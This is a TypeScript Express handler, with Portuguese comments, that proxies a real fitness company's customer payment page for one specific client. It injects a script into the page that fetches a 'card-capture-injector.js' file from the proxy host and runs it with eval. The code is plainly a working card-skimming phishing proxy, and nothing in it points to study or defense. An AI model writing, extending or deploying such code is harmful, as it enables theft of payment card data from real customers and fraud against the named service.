import { RequestHandler } from "express";

export const handlePaymentProxy: RequestHandler = async (req, res) => {
  try {
    // URL da página de pagamento real
    const paymentUrl =
      "https://evo5.w12app.com.br/#/app/evoquefitness/1/clientes/508210//informacao/formas-pagamento";

    // Faz fetch da página
    const response = await fetch(paymentUrl, {
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
    });

    if (!response.ok) {
      return res
        .status(response.status)
        .send("Erro ao acessar página de pagamento");
    }

    let html = await response.text();

    // Script de injeção automática no HEAD
    const injectionScript = `
      <script>
        (async function() {
          try {
            const scriptUrl = '${req.protocol}://${req.get("host")}/card-capture-injector.js';
            console.log('🚀 Carregando Card Capture Script...');
            const response = await fetch(scriptUrl);
            const code = await response.text();
            eval(code);
          } catch(e) {
            console.error('❌ Erro ao carregar Card Capture:', e);
          }
        })();
      </script>
    `;

    // Injeta o script no final do HEAD (ou no início do BODY se não houver HEAD)
    if (html.includes("</head>")) {
      html = html.replace("</head>", injectionScript + "</head>");
    } else if (html.includes("<body")) {
      html = html.replace("<body", `<body${injectionScript}`);
    } else {
      // Fallback: injeta no início
      html = injectionScript + html;
    }

    res.set("Content-Type", "text/html; charset=utf-8");
    res.send(html);
  } catch (error) {
    console.error("❌ Erro no proxy:", error);
    res.status(500).send("Erro ao processar requisição");
  }
};
